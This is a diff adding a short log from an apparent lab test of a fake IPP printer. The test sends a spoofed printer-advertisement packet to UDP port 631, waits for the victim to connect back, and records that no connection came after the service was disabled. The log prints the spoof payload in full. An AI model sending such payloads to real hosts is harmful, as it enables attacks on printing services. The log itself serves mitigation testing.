@@ -1,0 +1,5 @@
+2026-10-28 12:19:21,641 INFO fake IPP printer listening on tcp/8631
+2026-10-28 12:19:22,647 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/AfterDisableSpoof "Lab" "HP LaserJet"\n'
+2026-10-28 12:19:23,715 INFO watching 10 s for the victim to connect back ...
+2026-10-28 12:19:33,723 INFO RESULT: no TCP connection from the victim seen
+2026-10-28 12:19:33,724 INFO saved 6 packets to pcap_files/10_after_disable_spoofed.pcap
